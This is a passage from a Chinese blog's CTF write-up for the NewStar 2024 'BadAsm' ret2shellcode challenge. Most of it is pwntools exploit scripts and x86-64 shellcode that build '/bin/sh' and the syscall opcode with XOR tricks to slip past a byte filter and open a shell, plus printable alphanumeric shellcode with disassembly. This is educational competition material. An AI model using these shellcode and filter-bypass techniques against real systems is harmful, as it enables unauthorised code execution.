0x4028636f2e49226f</span><br><span class="hljs-string">mov rdx, 0x4040104040204040;//让/bin/sh\x00异或一遍这个，在异或一遍就还原了</span><br><span class="hljs-string">xor rsi, rdx</span><br><span class="hljs-string">push rsi       ; // 异或搓出来&#x27;/bin/sh\x00&#x27;(正好 8 字节，一个寄存器能存下) 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置</span><br><span class="hljs-string">; //设置</span><br><span class="hljs-string">mov ax, 0x454f</span><br><span class="hljs-string">xor ax, 0x4040</span><br><span class="hljs-string">mov rsi, rdi; //rdi指向shellcode起始位置，后移0x40拼在最后面</span><br><span class="hljs-string">add rsi, 0x40</span><br><span class="hljs-string">mov [rsi], ax  ; // 搓出来 syscall 的机器码 0f 05 并且拼接到当前 shellcode 后面。</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rsp   ; // 设置 rdi，指向之前 push 到栈上面的 &#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">xor rdx, rdx   ; // 设置 rsi, rdx</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov al, 59     ; // 设置 execve 的系统调用号</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;Input your Code :&quot;</span>, asm(shellcode).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>))<br></code></pre></td></tr></table></figure><ul><li>设置好寄存器的传参，将syscall放入可执行段中，这里是栈中，通过jump rsp执行syscall<ul><li>不需要nop指令链接，发送payload可以去掉ljust了</li></ul></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">; // 目标: 执行 execve(&quot;/bin/sh&quot;, 0, 0) 的 syscall</span><br><span class="hljs-string">mov rsp, rdi</span><br><span class="hljs-string">add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop</span><br><span class="hljs-string">mov rsi, 0x4028636f2e49226f</span><br><span class="hljs-string">mov rdx, 0x4040104040204040</span><br><span class="hljs-string">xor rsi, rdx</span><br><span class="hljs-string">push rsi       ; // 异或搓出来 &#x27;/bin/sh\x00&#x27; 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rsp   ; // 设置 rdi，指向之前push到栈上面的 &#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">xor rdx, rdx   ; // 设置 rsi, rdx</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov al, 59     ; //设置 execve 的系统调用号</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov cx, 0xf5ff</span><br><span class="hljs-string">xor cx, 0xf0f0 ; // 异或拿到 syscall 的机器码</span><br><span class="hljs-string">push rcx       ; // push 到栈顶，rsp 此时指向的是 syscall 指令</span><br><span class="hljs-string">jmp rsp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;Input your Code :&quot;</span>, asm(shellcode))<br></code></pre></td></tr></table></figure><blockquote><p>除了使用异或方式去除&#x2F;bin&#x2F;sh\x00后面的\x00，还可改为&#x2F;bin&#x2F;&#x2F;&#x2F;sh,shellcraft.sh()采用这种方法</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">;//目标:执行execve(&quot;/bin///sh&quot;,0,0)</span><br><span class="hljs-string">mov rsp,rdi</span><br><span class="hljs-string">add sp,0x0848 ;//给rsp一个合法值，使程序能正常执行push/pop</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">mov rax,0x732f2f2f6e69622f</span><br><span class="hljs-string">push rax;//将&#x27;/bin///sh&#x27;push到栈上面，最后一个字符使第六行push的，高位默认填充为0，此时就不用异或了</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rsp   ; // 设置 rdi，指向之前 push 到栈上面的 &#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">xor rdx, rdx   ; // 设置 rsi, rdx</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov al, 59     ; // 设置 execve 的系统调用号</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov cx, 0xf5ff</span><br><span class="hljs-string">xor cx, 0xf0f0 ; // 异或拿到 syscall 的机器码</span><br><span class="hljs-string">push rcx       ; // push 到栈顶，rsp 此时指向的是 syscall 指令</span><br><span class="hljs-string">jmp rsp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>使用mov byte ptr [r8+0x17],0xfmov byte ptr [r8+0x18],0x5使用汇编指令写入到内存中，拆开0xf 0x5</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov r8,rdi</span><br><span class="hljs-string">    mov rsp,rdi</span><br><span class="hljs-string">    add sp,0x0848</span><br><span class="hljs-string">    push 0x68</span><br><span class="hljs-string">    mov rax,0x732f2f2f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    mov al,59</span><br><span class="hljs-string">    mov byte ptr [r8+0x30],0xf</span><br><span class="hljs-string">    mov byte ptr [r8+0x31],0x5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Code : &#x27;</span>,asm(shellcode))<br></code></pre></td></tr></table></figure><p>查看写多少位，可以直接通过exp的debug信息，查看多少字节<img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B838FD9F9-95AB-4C11-90D3-B4C6D35D484B%7D.png" alt="{838FD9F9-95AB-4C11-90D3-B4C6D35D484B}"></p><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B01814C09-AFCD-4335-80C7-25B413A9663E%7D.png" alt="{01814C09-AFCD-4335-80C7-25B413A9663E}"></p><h4 id="wp1"><a href="#wp1" class="headerlink" title="wp1"></a>wp1</h4><p>[<a href="https://blog.csdn.net/weixin_52640415/article/details/142928435">NewStar 2024] week2_2024-newstarctf-week2-CSDN博客</a></p><p>调用read输入shellcraft</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <br>p = remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>, <span class="hljs-number">34301</span>)<br> <br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsp,rsi;</span><br><span class="hljs-string">add rsp,0x70;</span><br><span class="hljs-string">push rdi;pop rsi;</span><br><span class="hljs-string">xor rdi,rdi;</span><br><span class="hljs-string">push 0x70; pop rdx;</span><br><span class="hljs-string">push 0x17; pop rbx;</span><br><span class="hljs-string">xor byte ptr[rsi+rbx],0x40</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcode)+<span class="hljs-string">b&#x27;\x0f\x45&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&quot;Input your Code : \n&quot;</span>, shellcode)<br> <br>sleep(<span class="hljs-number">0.5</span>)<br>p.send(<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x20</span>+ asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p> 汇编的<code>;</code>会注释后面的代码，计算机器码的时候注意</p></blockquote><p><img src="https://sh1j1.github.io/img/NewStar/BadAsm.assets/%7B5C293AE0-A62A-4669-8356-90AF133643D1%7D.png" alt="{5C293AE0-A62A-4669-8356-90AF133643D1}"></p><h4 id="wp2"><a href="#wp2" class="headerlink" title="wp2"></a>wp2</h4><blockquote><p>放着了解一下，可见shellcode与超短shellcode</p></blockquote><p><a href="https://mr1bw.github.io/2024/10/08/%E7%A6%81%E7%94%A8syscall%E7%9A%84shellcode/#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">禁用syscall的shellcode | Mr.BW的妙妙屋</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>libc=ELF(<span class="hljs-string">&#x27;/home/mrbw/Desktop/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./asm&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./asm&#x27;</span>)<br><span class="hljs-comment">#r=remote(&#x27;39.106.48.123&#x27;, 28643)</span><br>s   = <span class="hljs-keyword">lambda</span> content : r.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : r.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : r.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : r.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : r.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : r.recvuntil(content)<br>ru(<span class="hljs-string">&quot;Input your Code : \n&quot;</span>)<br>gdb.attach(r,<span class="hljs-string">&#x27;b exec&#x27;</span>)<br>payload=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsp,rsi</span><br><span class="hljs-string">add rsp,0x50</span><br><span class="hljs-string">add rsp,0x50</span><br><span class="hljs-string">mov al,0x6</span><br><span class="hljs-string">xor [rdi+0x26],rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-comment">#payload+=b&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA&quot;</span><br><span class="hljs-comment">#payload+=b&quot;PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx&quot;</span><br>payload+=<span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x03&#x27;</span><br><span class="hljs-built_in">print</span>(payload)<br>s(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong>辅助</strong></p><p>超短shellcode出处</p><p><a href="https://blog.csdn.net/2301_79326514/article/details/142425141">CTF-PWN-ret2shellcode全解_ret2 ctf-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x00:  48 31 F6                         xor     rsi, rsi<br>0x03:  56                               push    rsi<br>0x04:  48 BF 2F 62 69 6E 2F 2F 73 68    movabs  rdi, 0x68732f2f6e69622f<br>0x0e:  57                               push    rdi<br>0x0f:  54                               push    rsp<br>0x10:  5F                               pop     rdi<br>0x11:  B0 3B                            mov     al, 0x3b<br>0x13:  99                               cdq     <br>0x14:  0F 05                            syscall  <br></code></pre></td></tr></table></figure><p>另外两种可见shellcode出处，全部转换成可见字符</p><p><a href="https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/">全是可见字符的shellcode | Introspelliam</a></p><p>第一个64位的，第二个32位的</p><blockquote><p>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA</p><p>505949494949494949494949515A5654583330565834415030413348483041303041424141425441415132414232424230424258503841434A4A49524A544B56384D49505232465538364D33534C495A473248364F3433535833303538364F43524359424E4C494D3351424B584448533043304550564F45323249424E464F334342483550305751434B394B51584D4B304141</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x00:  50                                  push rax<br>0x01:  59                                  pop  rcx<br>0x02:  49 49 49 49 49 49 49 49 49 49 51    push r9<br>0x0d:  5A                                  pop  rdx<br>0x0e:  56                                  push rsi<br>0x0f:  54                                  push rsp<br>0x10:  58                                  pop  rax<br>0x11:  33 30                               xor  esi, dword ptr [rax]<br>0x13:  56                                  push rsi<br>0x14:  58                                  pop  rax<br>0x15:  34 41                               xor  al, 0x41<br>0x17:  50                                  push rax<br>0x18:  30 41 33                            xor  byte ptr [rcx + 0x33], al<br>0x1b:  48 48 30 41 30                      xor  byte ptr [rcx + 0x30], al<br>0x20:  30 41 42                            xor  byte ptr [rcx + 0x42], al<br>0x23:  41 41 42 54                         push rsp<br>0x27:  41 41 51                            push r9<br>0x2a:  32 41 42                            xor  al, byte ptr [rcx + 0x42]<br>0x2d:  32 42 42                            xor  al, byte ptr [rdx + 0x42]<br>0x30:  30 42 42                            xor  byte ptr [rdx + 0x42], al<br>0x33:  58                                  pop  rax<br>0x34:  50                                  push rax<br>0x35:  38 41 43                            cmp  byte ptr [rcx + 0x43], al<br>0x38:  4A 4A 49 52                         push r10<br>0x3c:  4A 54                               push rsp<br>0x3e:  4B 56                               push r14<br>0x40:  38 4D 49                            cmp  byte ptr [rbp + 0x49], cl<br>0x43:  50                                  push rax<br>0x44:  52                                  push rdx<br>0x45:  32 46 55                            xor  al, byte ptr [rsi + 0x55]<br>0x48:  38 36                               cmp  byte ptr [rsi], dh<br>0x4a:  4D 33 53 4C                         xor  r10, qword ptr [r11 + 0x4c]<br>0x4e:  49 5A                               pop  r10<br>0x50:  47 32 48 36                         xor  r9b, byte ptr [r8 + 0x36]<br>0x54:  4F 34 33                            xor  al, 0x33<br>0x57:  53                                  push rbx<br>0x58:  58                                  pop  rax<br>0x59:  33 30                               xor  esi, dword ptr [rax]<br>0x5b:  35 38 36 4F 43                      xor  eax, 0x434f3638<br>0x60:  52                                  push rdx<br>0x61:  43 59                               pop  r9<br>0x63:  42 4E 4C 49 4D 33 51 42             xor  r10, qword ptr [r9 + 0x42]<br>0x6b:  4B 58                               pop  r8<br>0x6d:  44 48 53                            push rbx<br>0x70:  30 43 30                            xor  byte ptr [rbx + 0x30], al<br>0x73:  45 50                               push r8<br>0x75:  56                                  push rsi<br>0x76:  4F 45 32 32                         xor  r14b, byte ptr [r10]<br>0x7a:  49 42 4E 46 4F 33 43 42             xor  r8, qword ptr [r11 + 0x42]<br>0x82:  48 35 50 30 57 51                   xor  rax, 0x51573050<br>0x88:  43 4B 39 4B 51                      cmp  qword ptr [r11 + 0x51], rcx<br>0x8d:  58                                  pop  rax<br>0x8e:  4D 4B 30 41 41                      xor  byte ptr [r9 + 0x41], al<br></code></pre></td></tr></table></figure><blockquote><p>PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx</p><p>50596A30583430505050505150614A525834446A3059494949494930444E3052583530324130357239734F5054593031413031525835303044303563465A42505459303153583534304430355A4658625054594130314130315358353041303035586E52595053583541413030356E6E4358505358354141303035706C62585054594130315478</p><p>测试发现这是32位的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x00:  50                push  eax<br>0x01:  59                pop   ecx<br>0x02:  6A 30             push  0x30<br>0x04:  58                pop   eax<br>0x05:  34 30             xor   al, 0x30<br>0x07:  50                push  eax<br>0x08:  50                push  eax<br>0x09:  50                push  eax<br>0x0a:  50                push  eax<br>0x0b:  51                push  ecx<br>0x0c:  50                push  eax<br>0x0d:  61                popal <br>0x0e:  4A                dec   edx<br>0x0f:  52                push  edx<br>0x10:  58                pop   eax<br>0x11:  34 44             xor   al, 0x44<br>0x13:  6A 30             push  0x30<br>0x15:  59                pop   ecx<br>0x16:  49                dec   ecx<br>0x17:  49                dec   ecx<br>0x18:  49                dec   ecx<br>0x19:  49                dec   ecx<br>0x1a:  49                dec   ecx<br>0x1b:  30 44 4E 30       xor   byte ptr [esi + ecx*2 + 0x30], al<br>0x1f:  52                push  edx<br>0x20:  58                pop   eax<br>0x21:  35 30 32 41 30    xor   eax, 0x30413230<br>0x26:  35 72 39 73 4F    xor   eax, 0x4f733972<br>0x2b:  50                push  eax<br>0x2c:  54                push  esp<br>0x2d:  59                pop   ecx<br>0x2e:  30 31             xor   byte ptr [ecx], dh<br>0x30:  41                inc   ecx<br>0x31:  30 31             xor   byte ptr [ecx], dh<br>0x33:  52                push  edx<br>0x34:  58                pop   eax<br>0x35:  35 30 30 44 30    xor   eax, 0x30443030<br>0x3a:  35 63 46 5A 42    xor   eax, 0x425a4663<br>0x3f:  50                push  eax<br>0x40:  54                push  esp<br>0x41:  59                pop   ecx<br>0x42:  30 31             xor   byte ptr [ecx], dh<br>0x44:  53                push  ebx<br>0x45:  58                pop   eax<br>0x46:  35 34 30 44 30    xor   eax, 0x30443034<br>0x4b:  35 5A 46 58 62    xor   eax, 0x6258465a<br>0x50:  50                push  eax<br>0x51:  54                push  esp<br>0x52:  59                pop   ecx<br>0x53:  41                inc   ecx<br>0x54:  30 31             xor   byte ptr [ecx], dh<br>0x56:  41                inc   ecx<br>0x57:  30 31             xor   byte ptr [ecx], dh<br>0x59:  53                push  ebx<br>0x5a:  58                pop   eax<br>0x5b:  35 30 41 30 30    xor   eax, 0x30304130<br>0x60:  35 58 6E 52 59    xor   eax, 0x59526e58<br>0x65:  50                push  eax<br>0x66:  53                push  ebx<br>0x67:  58                pop   eax<br>0x68:  35 41 41 30 30    xor   eax, 0x30304141<br>0x6d:  35 6E 6E 43 58    xor   eax, 0x58436e6e<br>0x72:  50                push  eax<br>0x73:  53                push  ebx<br>0x74:  58                pop   eax<br>0x75:  35 41 41 30 30    xor   eax, 0x30304141<br>0x7a:  35 70 6C 62 58    xor   eax, 0x58626c70<br>0x7f:  50                push  eax<br>0x80:  54                push  esp<br>0x81:  59                pop   ecx<br>0x82:  41                inc   ecx<br>0x83:  30 31             xor   byte ptr [ecx], dh<br>0x85:  54                push  esp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>NewStar</category>
      
    </categories>
    
    
    <tags>
      
      <tag>每天一题的比赛复盘</tag>
      
      <tag>ret2shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
